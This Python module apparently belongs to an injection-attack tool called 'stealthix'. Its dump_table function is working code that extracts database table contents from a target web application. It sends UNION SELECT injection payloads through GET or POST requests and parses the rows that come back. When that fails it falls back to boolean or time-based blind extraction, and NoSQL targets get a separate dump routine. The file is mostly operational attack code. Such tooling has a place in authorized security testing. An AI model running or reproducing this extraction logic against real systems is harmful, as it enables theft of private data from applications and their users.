from __future__ import annotations

from typing import Any

from stealthix.core.session import ScanSession
from stealthix.detection.rest_api import method_uses_body
from stealthix.extraction.base import (
    _apply_injection,
    _extract_rows,
    _finalize_rows_result,
    _get_extraction_profile,
    _looks_like_db_error,
    _make_request,
    _merge_results,
    _plugin_family,
    _preferred_extraction_techniques,
    _prepare_payload,
    _record_success,
    _response_entry,
    _result_base,
)
from stealthix.extraction.blind import dump_table_blind
from stealthix.extraction.nosql_extract import dump_table_nosql


def dump_table(session: ScanSession, table: str, columns: list[str]) -> dict[str, Any]:
    if _plugin_family(session) == "nosql":
        return dump_table_nosql(session, table=table, columns=columns)
    if not columns:
        result = _result_base(session, "dump", [])
        result["table"] = table
        result["columns"] = columns
        result["rows"] = []
        return result
    joined = ",".join(columns)
    profile = _get_extraction_profile(session, "dump") or {}
    templates = profile.get("payloads") if isinstance(profile.get("payloads"), list) else []
    candidates = templates or ["' UNION SELECT {columns} FROM {table}--"]
    payloads: list[str] = []
    techniques = _preferred_extraction_techniques(session)
    results = _result_base(session, "dump", payloads if "union" in techniques else [])
    results["table"] = table
    results["columns"] = columns
    results["rows"] = []
    results["output"] = ""
    if "union" in techniques:
        for template in candidates:
            try:
                raw = str(template).format(columns=joined, table=table)
            except Exception:
                raw = f"' UNION SELECT {joined} FROM {table}--"
            payload = _prepare_payload(session, raw)
            payloads.append(payload)
            if method_uses_body(session.config.method):
                target, data = _apply_injection(session, payload)
                body, elapsed = _make_request(session, target, data, "POST")
            else:
                target, _ = _apply_injection(session, payload)
                body, elapsed = _make_request(session, target)
            results["responses"].append(
                _response_entry(target, payload, body, elapsed, limit=10000)
            )
            parsed_rows = _extract_rows(body, columns)
            if parsed_rows:
                results["rows"].extend(parsed_rows)
                results["output"] = body
                _record_success(results, payload)
                break
            if body.strip() and not _looks_like_db_error(body):
                results["rows"].append({"payload": payload, "raw": body})
                results["output"] = body
                _record_success(results, payload)
                break
        results = _finalize_rows_result(results, "rows")
        if results["success"]:
            results["technique"] = "union"
            return results

    merged = results
    for technique in techniques:
        if technique not in {"boolean", "time"}:
            continue
        blind_result = dump_table_blind(session, table=table, columns=columns, technique=technique)
        merged = _merge_results(results, blind_result)
        if blind_result.get("success"):
            return merged
    return merged
